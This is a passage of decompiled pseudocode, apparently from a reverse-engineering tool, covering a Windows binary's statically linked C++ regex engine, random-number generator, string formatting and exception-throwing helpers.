  lVar1 = *(longlong *)(*(longlong *)(param_1 + 8) + 0x10);
  if (lVar1 != 0) {
    *(longlong *)(param_2 + 0x10) = lVar1;
    *(longlong *)(*(longlong *)(*(longlong *)(param_1 + 8) + 0x10) + 0x18) = param_2;
  }
  *(longlong *)(*(longlong *)(param_1 + 8) + 0x10) = param_2;
  *(longlong *)(param_1 + 8) = param_2;
  return param_2;
}



undefined4 * FUN_14000a5b0(undefined4 *param_1,undefined4 param_2)

{
  undefined **ppuVar1;
  
  *param_1 = param_2;
  ppuVar1 = FUN_140002eb0();
  *(undefined ***)(param_1 + 2) = ppuVar1;
  return param_1;
}



void FUN_14000a5d0(undefined (*param_1) [16],undefined4 *param_2,
                  basic_string_char_struct_std__char_traits_char__class_std__allocator_char___
                  *param_3)

{
  undefined8 ****ppppuVar1;
  undefined auStack120 [40];
  basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *local_50;
  undefined8 ****local_48 [2];
  __uint64 local_38;
  ulonglong local_30;
  ulonglong local_28;
  
  local_28 = DAT_140017038 ^ (ulonglong)auStack120;
  local_50 = param_3;
  if (*(longlong *)(param_3 + 0x10) != 0) {
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::append
              (param_3,": ",2);
  }
  (**(code **)(**(longlong **)(param_2 + 2) + 0x10))(*(longlong **)(param_2 + 2),local_48,*param_2);
  ppppuVar1 = local_48;
  if (0xf < local_30) {
    ppppuVar1 = local_48[0];
  }
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::append
            (param_3,(char *)ppppuVar1,local_38);
  if (0xf < local_30) {
    ppppuVar1 = local_48[0];
    if ((0xfff < local_30 + 1) &&
       (ppppuVar1 = (undefined8 ****)local_48[0][-1],
       (char *)0x1f < (char *)((longlong)local_48[0] + (-8 - (longlong)ppppuVar1)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(ppppuVar1);
  }
  *param_1 = ZEXT816(0);
  *(undefined8 *)param_1[1] = 0;
  *(undefined8 *)(param_1[1] + 8) = 0;
  memcpy(param_1,param_3,0x20);
  *(undefined8 *)(param_3 + 0x10) = 0;
  *(undefined8 *)(param_3 + 0x10) = 0;
  *(undefined8 *)(param_3 + 0x18) = 0xf;
  *param_3 = (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___)0x0;
  FUN_14000eed0(local_28 ^ (ulonglong)auStack120);
  return;
}



void FUN_14000a6d8(longlong param_1)

{
  uint *puVar1;
  
  puVar1 = (uint *)(*(longlong *)(param_1 + 8) + 0xc);
  *puVar1 = *puVar1 | 4;
  return;
}



// WARNING: Could not reconcile some variable overlaps

ulonglong FUN_14000a6e4(byte **param_1,longlong param_2)

{
  byte **ppbVar1;
  char *pcVar2;
  char *pcVar3;
  longlong lVar4;
  code *pcVar5;
  char cVar6;
  int iVar7;
  uint uVar8;
  ulonglong uVar9;
  byte *pbVar10;
  bool bVar11;
  byte bVar12;
  bool bVar13;
  undefined local_40 [16];
  longlong local_30;
  byte *local_28;
  
  if ((0 < *(int *)(param_1 + 0x1c)) &&
     (iVar7 = *(int *)(param_1 + 0x1c) + -1, *(int *)(param_1 + 0x1c) = iVar7, iVar7 < 1)) {
    std::_Xregex_error(0xc);
    pcVar5 = (code *)swi(3);
    uVar9 = (*pcVar5)();
    return uVar9;
  }
  if ((0 < *(int *)((longlong)param_1 + 0xdc)) &&
     (iVar7 = *(int *)((longlong)param_1 + 0xdc) + -1, *(int *)((longlong)param_1 + 0xdc) = iVar7,
     iVar7 < 1)) {
    std::_Xregex_error(0xb);
    pcVar5 = (code *)swi(3);
    uVar9 = (*pcVar5)();
    return uVar9;
  }
  bVar13 = false;
  bVar11 = bVar13;
  if (param_2 != 0) {
    do {
      iVar7 = *(int *)(param_2 + 8);
      bVar11 = true;
      if (iVar7 < 0xc) {
        if (iVar7 == 0xb) {
LAB_14000a857:
          pbVar10 = *param_1;
          ppbVar1 = param_1 + 1;
          local_40 = ZEXT816(0);
          local_30 = 0;
          FUN_1400020cc((void **)local_40,(longlong)param_1[2] - (longlong)*ppbVar1 >> 2,ppbVar1,
                        (longlong *)(param_1 + 2));
          local_28 = param_1[4];
          uVar9 = FUN_14000a6e4(param_1,*(longlong *)(param_2 + 0x20));
          if ((bool)(char)uVar9 == (iVar7 == 0xb)) {
            *param_1 = pbVar10;
            if (ppbVar1 != (byte **)local_40) {
              FUN_140001aac(ppbVar1,local_40._0_8_,local_40._8_8_ - (longlong)local_40._0_8_ >> 2);
              param_1[4] = local_28;
            }
            bVar13 = true;
          }
          else {
            *param_1 = pbVar10;
          }
          if (local_40._0_8_ != (byte *)0x0) {
            pbVar10 = local_40._0_8_;
            if ((0xfff < (local_30 - (longlong)local_40._0_8_ & 0xfffffffffffffffcU)) &&
               (pbVar10 = *(byte **)(local_40._0_8_ + -8),
               (byte *)0x1f < local_40._0_8_ + (-8 - (longlong)pbVar10))) {
                    // WARNING: Subroutine does not return
              _invalid_parameter_noinfo_noreturn();
            }
            free(pbVar10);
          }
          goto LAB_14000aba8;
        }
        if (iVar7 < 6) {
          if (iVar7 != 5) {
            if (iVar7 == 0) {
LAB_14000ac0c:
              std::_Xregex_error(0xd);
              pcVar5 = (code *)swi(3);
              uVar9 = (*pcVar5)();
              return uVar9;
            }
            if (iVar7 != 1) {
              if (iVar7 == 2) {
                if (((*(uint *)((longlong)param_1 + 0xbc) & 0x100) == 0) &&
                   (*param_1 == param_1[0x13])) {
                  bVar12 = *(byte *)((longlong)param_1 + 0xbc);
                  goto LAB_14000a7c1;
                }
                bVar12 = (*param_1)[-1];
LAB_14000a7f6:
                bVar13 = bVar12 != 10;
              }
              else if (iVar7 == 3) {
                if (*param_1 != param_1[0x14]) {
                  bVar12 = **param_1;
                  goto LAB_14000a7f6;
                }
                bVar12 = (byte)(*(uint *)((longlong)param_1 + 0xbc) >> 1);
LAB_14000a7c1:
                bVar13 = (bool)(bVar12 & 1);
              }
              else {
                if (iVar7 != 4) goto LAB_14000ac0c;
                uVar9 = FUN_14000a504(param_1);
                bVar13 = (byte)uVar9 == ((byte)*(undefined4 *)(param_2 + 0xc) & 1);
              }
            }
            goto LAB_14000aba8;
          }
          pbVar10 = *param_1;
          if (((pbVar10 == param_1[0x14]) || (*pbVar10 == 10)) || (*pbVar10 == 0xd))
          goto LAB_14000a820;
          pbVar10 = pbVar10 + 1;
LAB_14000a818:
          *param_1 = pbVar10;
          goto LAB_14000aba8;
        }
        if (iVar7 == 6) {
          pbVar10 = (byte *)FUN_140001d40((char *)*param_1,(char *)param_1[0x14],
                                          *(char **)(param_2 + 0x28),
                                          *(char **)(param_2 + 0x28) + *(uint *)(param_2 + 0x24),
                                          (longlong **)param_1[0x1a],*(uint *)(param_1 + 0x17));
          if (pbVar10 == *param_1) {
LAB_14000a820:
            bVar13 = true;
            goto LAB_14000aba8;
          }
          goto LAB_14000a818;
        }
        if (iVar7 != 7) {
          if ((iVar7 == 8) || (iVar7 == 9)) goto LAB_14000aba8;
          if (iVar7 != 10) goto LAB_14000ac0c;
          goto LAB_14000a857;
        }
        if ((*param_1 == param_1[0x14]) || (bVar13 = FUN_1400094f4(param_1,param_2), !bVar13))
        break;
        bVar13 = false;
      }
      else {
        if (iVar7 < 0x12) {
          if (iVar7 != 0x11) {
            if (iVar7 == 0xc) goto LAB_14000aba5;
            if (iVar7 == 0xd) {
              *(byte **)(param_1[5] + (ulonglong)*(uint *)(param_2 + 0x20) * 0x10) = *param_1;
              pbVar10 = param_1[4];
              while ((byte *)(ulonglong)*(uint *)(param_2 + 0x20) < pbVar10) {
                pbVar10 = pbVar10 + -1;
                *(uint *)(param_1[1] + ((ulonglong)pbVar10 >> 5) * 4) =
                     *(uint *)(param_1[1] + ((ulonglong)pbVar10 >> 5) * 4) &
                     ~(1 << ((uint)pbVar10 & 0x1f));
              }
            }
            else if (iVar7 == 0xe) {
              lVar4 = *(longlong *)(param_2 + 0x20);
              if ((*(char *)((longlong)param_1 + 0xc1) != '\0') || (*(int *)(lVar4 + 0x20) != 0)) {
                uVar9 = (ulonglong)(*(uint *)(lVar4 + 0x20) >> 5);
                *(uint *)(param_1[1] + uVar9 * 4) =
                     *(uint *)(param_1[1] + uVar9 * 4) | 1 << (*(uint *)(lVar4 + 0x20) & 0x1f);
                *(byte **)(param_1[5] + (ulonglong)*(uint *)(lVar4 + 0x20) * 0x10 + 8) = *param_1;
              }
            }
            else {
              if (iVar7 != 0xf) {
                if (iVar7 != 0x10) goto LAB_14000ac0c;
                uVar9 = FUN_140009868((longlong *)param_1,param_2);
                cVar6 = (char)uVar9;
                goto LAB_14000ab9c;
              }
              uVar8 = *(uint *)(param_2 + 0x20);
              if ((*(uint *)(param_1[1] + (ulonglong)(uVar8 >> 5) * 4) >> ((byte)uVar8 & 0x1f) & 1)
                  != 0) {
                pbVar10 = *param_1;
                pcVar2 = *(char **)(param_1[5] + (ulonglong)uVar8 * 0x10);
                pcVar3 = *(char **)(param_1[5] + (ulonglong)uVar8 * 0x10 + 8);
                if ((pcVar2 != pcVar3) &&
                   (pbVar10 = (byte *)FUN_140001d40((char *)pbVar10,(char *)param_1[0x14],pcVar2,
                                                    pcVar3,(longlong **)param_1[0x1a],
                                                    *(uint *)(param_1 + 0x17)), pbVar10 == *param_1)
                   ) break;
                *param_1 = pbVar10;
              }
            }
          }
        }
        else {
          if (iVar7 == 0x12) {
            uVar8 = *(uint *)(param_2 + 0xc);
            iVar7 = 0;
LAB_14000ab8e:
            uVar9 = FUN_140009b4c((longlong *)param_1,param_2,(byte)(uVar8 >> 1) & 1,iVar7);
            cVar6 = (char)uVar9;
LAB_14000ab9c:
            if (cVar6 == '\0') {
              bVar13 = true;
            }
          }
          else if (iVar7 == 0x13) {
            param_2 = *(longlong *)(param_2 + 0x20);
            if (*(int *)(param_2 + 0x34) == 0) {
              uVar8 = *(uint *)(param_2 + 0xc);
              iVar7 = *(int *)(param_1[0x10] + (ulonglong)*(uint *)(param_2 + 0x30) * 0x10);
              goto LAB_14000ab8e;
            }
          }
          else {
            if (iVar7 == 0x14) goto LAB_14000aba8;
            if (iVar7 != 0x15) goto LAB_14000ac0c;
            if ((((*(uint *)((longlong)param_1 + 0xbc) & 0x2020) == 0) ||
                (param_1[0x13] != *param_1)) &&
               ((*(char *)(param_1 + 0x1b) == '\0' || (*param_1 == param_1[0x14])))) {
              if ((*(char *)(param_1 + 0x18) == '\0') ||
                 (uVar9 = FUN_140008748((longlong)param_1), (char)uVar9 != '\0')) {
                FUN_14000658c(param_1 + 8,param_1);
                *(undefined *)(param_1 + 0x18) = 1;
              }
            }
            else {
              bVar13 = true;
            }
          }
LAB_14000aba5:
          param_2 = 0;
        }
LAB_14000aba8:
        bVar11 = bVar13;
        if (bVar13 != false) break;
      }
      bVar11 = bVar13;
      if ((param_2 == 0) || (param_2 = *(longlong *)(param_2 + 0x10), param_2 == 0)) break;
    } while( true );
  }
  uVar8 = *(uint *)(param_1 + 0x1c);
  if (0 < (int)uVar8) {
    uVar8 = uVar8 + 1;
    *(uint *)(param_1 + 0x1c) = uVar8;
  }
  return (ulonglong)uVar8 & 0xffffffffffffff00 | (ulonglong)(bVar11 == false);
}



void FUN_14000ac24(longlong param_1)

{
  uint *puVar1;
  
  puVar1 = (uint *)(*(longlong *)(param_1 + 8) + 0xc);
  *puVar1 = *puVar1 ^ 1;
  return;
}



void FUN_14000ac30(longlong param_1,undefined4 param_2)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar1 = (undefined8 *)operator_new(0x20);
  puVar2 = (undefined8 *)0x0;
  if (puVar1 != (undefined8 *)0x0) {
    *(undefined4 *)(puVar1 + 1) = param_2;
    *puVar1 = std::_Node_base::vftable;
    *(undefined4 *)((longlong)puVar1 + 0xc) = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar2 = puVar1;
  }
  FUN_14000a578(param_1,(longlong)puVar2);
  return;
}



void FUN_14000ac88(char **param_1)

{
  char cVar1;
  char *pcVar2;
  
  pcVar2 = *param_1;
  if (pcVar2 != param_1[2]) {
    if (*pcVar2 == '\\') {
      cVar1 = FUN_14000a4c8((longlong *)param_1);
      if (cVar1 != '\0') {
        pcVar2 = pcVar2 + 1;
      }
    }
    *param_1 = pcVar2 + 1;
  }
  FUN_14000b7d8(param_1);
  return;
}



ulonglong FUN_14000acd8(char **param_1)

{
  ulonglong uVar1;
  
  uVar1 = FUN_1400095fc(param_1,8,3,2);
  return uVar1 & 0xffffffffffffff00 | (ulonglong)((int)uVar1 != 3);
}



void FUN_14000acfc(undefined (*param_1) [16],char **param_2,undefined8 *param_3,undefined8 *param_4)

{
  void *pvVar1;
  ulonglong uVar2;
  char *pcVar3;
  void *_Memory;
  undefined8 ****ppppuVar4;
  char *pcVar5;
  undefined auStack200 [48];
  undefined8 *local_98;
  undefined8 uStack144;
  undefined4 local_88;
  undefined (*local_80) [16];
  char local_78;
  undefined7 uStack119;
  __uint64 local_68;
  ulonglong local_60;
  undefined8 ****local_58 [2];
  __uint64 local_48;
  ulonglong local_40;
  ulonglong local_38;
  
  local_38 = DAT_140017038 ^ (ulonglong)auStack200;
  *param_1 = ZEXT816(0);
  *(undefined8 *)param_1[1] = 0;
  *(undefined8 *)param_1[1] = 0;
  *(undefined8 *)(param_1[1] + 8) = 0xf;
  (*param_1)[0] = 0;
  local_88 = 1;
  local_80 = param_1;
  uVar2 = FUN_14000e3d0();
  local_98 = param_3;
  if (7 < (ulonglong)param_3[3]) {
    local_98 = (undefined8 *)*param_3;
  }
  uStack144 = param_3[2];
  FUN_140002604((undefined (*) [16])local_58,(UINT)uVar2,(LPCWSTR *)&local_98);
  local_98 = param_4;
  if (7 < (ulonglong)param_4[3]) {
    local_98 = (undefined8 *)*param_4;
  }
  uStack144 = param_4[2];
  FUN_140002604((undefined (*) [16])&local_78,(UINT)uVar2,(LPCWSTR *)&local_98);
  pcVar3 = param_2[1] + local_68 + local_48 + (ulonglong)(-(uint)(local_68 != 0) & 4) + 4;
  pcVar5 = *(char **)param_1[1];
  if ((pcVar5 <= pcVar3) && (*(char **)(param_1[1] + 8) != pcVar3)) {
    if (*(char **)(param_1[1] + 8) < pcVar3) {
      FUN_140003b30((void **)param_1,(longlong)pcVar3 - (longlong)pcVar5);
      *(char **)param_1[1] = pcVar5;
    }
    else if ((pcVar3 < &DAT_00000010) && (0xf < *(ulonglong *)(param_1[1] + 8))) {
      FUN_140008498((void **)param_1);
    }
  }
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::append
            ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)param_1
             ,*param_2,(__uint64)param_2[1]);
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::append
            ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)param_1
             ,": \"",3);
  ppppuVar4 = local_58;
  if (0xf < local_40) {
    ppppuVar4 = local_58[0];
  }
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::append
            ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)param_1
             ,(char *)ppppuVar4,local_48);
  if (local_68 != 0) {
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::append
              ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
               param_1,"\", \"",4);
    pcVar5 = &local_78;
    if (0xf < local_60) {
      pcVar5 = (char *)CONCAT71(uStack119,local_78);
    }
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::append
              ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
               param_1,pcVar5,local_68);
  }
  uVar2 = *(ulonglong *)param_1[1];
  if (uVar2 < *(ulonglong *)(param_1[1] + 8)) {
    *(ulonglong *)param_1[1] = uVar2 + 1;
    if (0xf < *(ulonglong *)(param_1[1] + 8)) {
      param_1 = *(undefined (**) [16])*param_1;
    }
    *(undefined2 *)(*param_1 + uVar2) = 0x22;
  }
  else {
    FUN_140003898((void **)param_1,1,0,0x22);
  }
  if (0xf < local_60) {
    pvVar1 = (void *)CONCAT71(uStack119,local_78);
    _Memory = pvVar1;
    if ((0xfff < local_60 + 1) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  local_68 = 0;
  local_60 = 0xf;
  local_78 = '\0';
  if (0xf < local_40) {
    ppppuVar4 = local_58[0];
    if ((0xfff < local_40 + 1) &&
       (ppppuVar4 = (undefined8 ****)local_58[0][-1],
       (char *)0x1f < (char *)((longlong)local_58[0] + (-8 - (longlong)ppppuVar4)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(ppppuVar4);
  }
  FUN_14000eed0(local_38 ^ (ulonglong)auStack200);
  return;
}



void FUN_14000af88(char **param_1)

{
  int iVar1;
  code *pcVar2;
  ulonglong uVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  
  iVar1 = *(int *)((longlong)param_1 + 0x7c);
  iVar4 = 0;
  iVar6 = -1;
  iVar5 = iVar4;
  if (iVar1 == 0x2a) goto LAB_14000afbb;
  if (iVar1 == 0x2b) {
    iVar6 = -1;
    iVar5 = 1;
    goto LAB_14000afbb;
  }
  if (iVar1 == 0x3f) {
    iVar6 = 1;
    iVar5 = 0;
    goto LAB_14000afbb;
  }
  if (iVar1 != 0x7b) {
    return;
  }
  FUN_14000ac88(param_1);
  uVar3 = FUN_14000935c(param_1,7);
  if ((char)uVar3 == '\0') goto LAB_14000b085;
  iVar5 = *(int *)((longlong)param_1 + 0x74);
  iVar6 = iVar5;
  if (*(int *)((longlong)param_1 + 0x7c) == 0x2c) {
    FUN_14000ac88(param_1);
    iVar6 = -1;
    if (*(int *)((longlong)param_1 + 0x7c) != 0x7d) {
      uVar3 = FUN_14000935c(param_1,7);
      if ((char)uVar3 == '\0') goto LAB_14000b085;
      iVar6 = *(int *)((longlong)param_1 + 0x74);
      goto LAB_14000b03e;
    }
  }
  else {
LAB_14000b03e:
    if (*(int *)((longlong)param_1 + 0x7c) != 0x7d) goto LAB_14000b085;
  }
  if ((iVar6 == -1) || (iVar5 <= iVar6)) {
LAB_14000afbb:
    FUN_14000a6d8((longlong)(param_1 + 8));
    FUN_14000ac88(param_1);
    if (((*(uint *)(param_1 + 0x10) & 0x400) == 0) || (*(int *)((longlong)param_1 + 0x7c) != 0x3f))
    {
      iVar4 = 1;
    }
    else {
      FUN_14000ac88(param_1);
    }
    FUN_140007eb4((longlong *)(param_1 + 8),iVar5,iVar6,(byte)iVar4);
    return;
  }
LAB_14000b085:
  FUN_140009e2c(param_1,7);
  pcVar2 = (code *)swi(3);
  (*pcVar2)();
  return;
}



uint FUN_14000b094(undefined4 *param_1)

{
  uint *puVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  longlong lVar5;
  
  uVar3 = param_1[0x271];
  lVar5 = 0xe3;
  puVar4 = param_1 + 0x271;
  do {
    puVar1 = puVar4 + 1;
    uVar2 = (*puVar1 ^ uVar3) & 0x7fffffff ^ uVar3;
    uVar3 = *puVar1;
    puVar4[-0x270] = -(uint)((uVar2 & 1) != 0) & 0x9908b0df ^ puVar4[0x18d] ^ uVar2 >> 1;
    lVar5 = lVar5 + -1;
    puVar4 = puVar1;
  } while (lVar5 != 0);
  lVar5 = 0x18c;
  uVar3 = param_1[0x354];
  puVar4 = param_1 + 0x354;
  do {
    puVar1 = puVar4 + 1;
    uVar2 = (*puVar1 ^ uVar3) & 0x7fffffff ^ uVar3;
    uVar3 = *puVar1;
    puVar4[-0x270] = -(uint)((uVar2 & 1) != 0) & 0x9908b0df ^ puVar4[-0x353] ^ uVar2 >> 1;
    lVar5 = lVar5 + -1;
    puVar4 = puVar1;
  } while (lVar5 != 0);
  uVar3 = (param_1[0x4e0] ^ param_1[1]) & 0x7fffffff ^ param_1[0x4e0];
  *param_1 = 0;
  param_1[0x270] = -(uint)((uVar3 & 1) != 0) & 0x9908b0df ^ param_1[0x18d] ^ uVar3 >> 1;
  return uVar3 & 0xffffff00 | (uint)(byte)-((byte)uVar3 & 1);
}



void FUN_14000b168(int *param_1,int param_2,longlong param_3)

{
  uint uVar1;
  int iVar2;
  
  iVar2 = 0;
  if (param_2 != 0) {
    param_1[1] = 0xffff;
    if ((((param_2 == 2) || (param_2 == 3)) || (param_2 == 0x35)) || (param_2 == 0x7b)) {
      iVar2 = 1;
    }
    goto LAB_14000b1e4;
  }
  uVar1 = *(uint *)(param_3 + 0x10);
  param_1[1] = (-(uint)((uVar1 & 1) != 0) & 0xffffff6e) + 0x1ff;
  if ((uVar1 >> 10 & 1) != 0) {
    if (*(int *)(param_3 + 0x14) == -0x5ffffff4) {
      iVar2 = 4;
      goto LAB_14000b1e4;
    }
    if (*(int *)(param_3 + 0x14) == -0x5ffffffd) {
      iVar2 = 10;
      goto LAB_14000b1e4;
    }
  }
  iVar2 = (uVar1 >> 4 & 1) + 2;
LAB_14000b1e4:
  *param_1 = iVar2;
  return;
}



void FUN_14000b1e8(longlong *param_1)

{
  *(uint *)(*param_1 + 0xc) = *(uint *)(*param_1 + 0xc) | 8;
  return;
}



byte * FUN_14000b1f0(longlong param_1,byte *param_2,byte *param_3,longlong param_4)

{
  int iVar1;
  longlong lVar2;
  byte bVar3;
  byte bVar4;
  byte *pbVar5;
  ulonglong uVar6;
  byte *pbVar7;
  uint uVar8;
  
  if (param_4 == 0) {
    param_4 = *(longlong *)(param_1 + 0xb0);
  }
  if (param_2 == param_3) {
    return param_2;
  }
  do {
    while( true ) {
      if (param_4 == 0) {
        return param_2;
      }
      iVar1 = *(int *)(param_4 + 8);
      if (iVar1 < 0xc) break;
      if (0x11 < iVar1) {
        if (iVar1 == 0x12) {
          return param_2;
        }
        if (iVar1 == 0x13) {
          return param_2;
        }
        if (iVar1 != 0x14) {
          if (iVar1 != 0x15) {
            return param_2;
          }
          goto LAB_14000b2f5;
        }
        goto LAB_14000b24d;
      }
      if (iVar1 == 0x11) {
        return param_2;
      }
      if (iVar1 != 0xc) {
        if ((iVar1 != 0xd) && (iVar1 != 0xe)) {
          if (iVar1 == 0xf) {
            return param_2;
          }
          if (iVar1 != 0x10) {
            return param_2;
          }
          do {
            if (param_4 == 0) {
              return param_3;
            }
            param_3 = FUN_14000b1f0(param_1,param_2,param_3,*(longlong *)(param_4 + 0x10));
            param_4 = *(longlong *)(param_4 + 0x28);
          } while (param_2 != param_3);
          return param_3;
        }
        goto LAB_14000b24d;
      }
LAB_14000b2f5:
      param_4 = 0;
    }
    if (iVar1 == 0xb) {
      return param_2;
    }
    if (iVar1 < 6) {
      if (iVar1 == 5) {
        return param_2;
      }
      if (iVar1 == 0) {
        return param_2;
      }
      if (iVar1 != 1) {
        if (iVar1 != 2) {
          if (iVar1 != 3) {
            return param_2;
          }
          do {
            if (*param_2 == 10) {
              return param_2;
            }
            param_2 = param_2 + 1;
          } while (param_2 != param_3);
          return param_2;
        }
        if (param_2[-1] == 10) {
          return param_2;
        }
        goto LAB_14000b32a;
      }
    }
    else {
      if (iVar1 == 6) {
        do {
          pbVar5 = param_2 + 1;
          pbVar7 = (byte *)FUN_140001d40((char *)param_2,(char *)pbVar5,*(char **)(param_4 + 0x28),
                                         *(char **)(param_4 + 0x28) + 1,
                                         *(longlong ***)(param_1 + 0xd0),*(uint *)(param_1 + 0xb8));
          if (pbVar7 != param_2) {
            return param_2;
          }
          param_2 = pbVar5;
        } while (pbVar5 != param_3);
        return pbVar5;
      }
      if (iVar1 == 7) break;
      if ((iVar1 != 8) && (iVar1 != 9)) {
        return param_2;
      }
    }
LAB_14000b24d:
    param_4 = *(longlong *)(param_4 + 0x10);
  } while( true );
LAB_14000b348:
  uVar8 = *(uint *)(param_1 + 0xb8);
  bVar3 = *param_2;
  if ((uVar8 >> 8 & 1) != 0) {
    bVar3 = std::ctype<char>::tolower(*(ctype_char_ **)(*(longlong *)(param_1 + 0xd0) + 8),bVar3);
    uVar8 = *(uint *)(param_1 + 0xb8);
  }
  if ((*(uint **)(param_4 + 0x20) == (uint *)0x0) ||
     (pbVar5 = (byte *)FUN_1400030c8((char *)param_2,(char *)(param_2 + 1),
                                     *(uint **)(param_4 + 0x20)), pbVar5 == param_2)) {
    lVar2 = *(longlong *)(param_4 + 0x38);
    if (lVar2 != 0) {
      bVar4 = bVar3;
      if ((uVar8 >> 0xb & 1) != 0) {
        bVar4 = FUN_14000cf04(*(longlong ***)(param_1 + 0xd0),bVar3);
      }
      uVar6 = FUN_140003134((uint)bVar4,lVar2);
      if ((char)uVar6 != '\0') goto LAB_14000b3eb;
    }
    if ((*(longlong *)(param_4 + 0x28) != 0) &&
       ((*(byte *)((ulonglong)(bVar3 >> 3) + *(longlong *)(param_4 + 0x28)) &
        (byte)(1 << (bVar3 & 7))) != 0)) goto LAB_14000b3eb;
    bVar3 = 0;
  }
  else {
LAB_14000b3eb:
    bVar3 = 1;
  }
  if (bVar3 != (*(byte *)(param_4 + 0xc) & 1)) {
    return param_2;
  }
  param_2 = param_2 + 1;
  if (param_2 == param_3) {
    return param_2;
  }
  goto LAB_14000b348;
  while (param_2 = param_2 + 1, param_2 != param_3) {
LAB_14000b32a:
    if (*param_2 == 10) break;
  }
  if (param_2 == param_3) {
    return param_2;
  }
  return param_2 + 1;
}



void FUN_14000b454(void)

{
  undefined8 local_28 [5];
  
  FUN_1400057f8(local_28);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_28,(ThrowInfo *)&DAT_140014c88);
}



void FUN_14000b474(void)

{
  undefined8 local_28 [5];
  
  FUN_140005854(local_28);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_28,(ThrowInfo *)&DAT_140014e00);
}



void FUN_14000b494(void *param_1,undefined4 *param_2,void **param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined local_d8 [16];
  undefined8 local_c8 [4];
  undefined8 local_a8 [20];
  
  uVar1 = *param_2;
  uVar2 = param_2[1];
  uVar3 = param_2[2];
  uVar4 = param_2[3];
  FUN_1400054e8((undefined (*) [16])local_c8,param_1);
  local_d8 = CONCAT412(uVar4,CONCAT48(uVar3,CONCAT44(uVar2,uVar1)));
  FUN_14000598c(local_a8,local_c8,param_3,(char **)local_d8);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_a8,(ThrowInfo *)&DAT_140014e60);
}



void FUN_14000b4e8(undefined4 param_1)

{
  undefined4 *puVar1;
  undefined4 local_58;
  undefined4 uStack84;
  undefined4 uStack80;
  undefined4 uStack76;
  undefined4 local_48 [4];
  undefined8 local_38 [7];
  
  puVar1 = FUN_14000c60c(local_48,param_1);
  local_58 = *puVar1;
  uStack84 = puVar1[1];
  uStack80 = puVar1[2];
  uStack76 = puVar1[3];
  FUN_140005be4(local_38,(undefined8 *)&local_58);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_38,(ThrowInfo *)&DAT_140014d68);
}



void FUN_14000b524(undefined4 param_1)

{
  undefined4 *puVar1;
  undefined4 local_58;
  undefined4 uStack84;
  undefined4 uStack80;
  undefined4 uStack76;
  undefined4 local_48 [4];
  undefined8 local_38 [7];
  
  puVar1 = FUN_14000a5b0(local_48,param_1);
  local_58 = *puVar1;
  uStack84 = puVar1[1];
  uStack80 = puVar1[2];
  uStack76 = puVar1[3];
  FUN_140005be4(local_38,(undefined8 *)&local_58);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_38,(ThrowInfo *)&DAT_140014d68);
}



void FUN_14000b560(undefined8 *param_1)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar2 = (undefined8 *)*param_1;
  while (puVar2 != (undefined8 *)0x0) {
    puVar1 = (undefined8 *)puVar2[2];
    puVar2[2] = 0;
    (**(code **)*puVar2)(puVar2,1);
    puVar2 = puVar1;
  }
  *param_1 = 0;
  return;
}



void FUN_14000b5a0(longlong param_1)

{
  void *pvVar1;
  void *_Memory;
  longlong lVar2;
  
  if ((*(byte *)(param_1 + 0x70) & 1) != 0) {
    if (**(longlong **)(param_1 + 0x40) == 0) {
      lVar2 = (longlong)**(int **)(param_1 + 0x50) + **(longlong **)(param_1 + 0x38);
    }
    else {
      lVar2 = (longlong)**(int **)(param_1 + 0x58) + **(longlong **)(param_1 + 0x40);
    }
    pvVar1 = **(void ***)(param_1 + 0x18);
    _Memory = pvVar1;
    if ((0xfff < (ulonglong)(lVar2 - (longlong)pvVar1)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  **(undefined8 **)(param_1 + 0x18) = 0;
  **(undefined8 **)(param_1 + 0x38) = 0;
  **(undefined4 **)(param_1 + 0x50) = 0;
  **(undefined8 **)(param_1 + 0x20) = 0;
  **(undefined8 **)(param_1 + 0x40) = 0;
  **(undefined4 **)(param_1 + 0x58) = 0;
  *(undefined8 *)(param_1 + 0x68) = 0;
  *(uint *)(param_1 + 0x70) = *(uint *)(param_1 + 0x70) & 0xfffffffe;
  return;
}



void FUN_14000b64c(longlong **param_1)

{
  longlong *plVar1;
  longlong *plVar2;
  
  plVar1 = *param_1;
  if (plVar1 != (longlong *)0x0) {
    plVar2 = param_1[1];
    for (; plVar1 != plVar2; plVar1 = plVar1 + 9) {
      FUN_140006268(plVar1);
    }
    plVar1 = *param_1;
    plVar2 = plVar1;
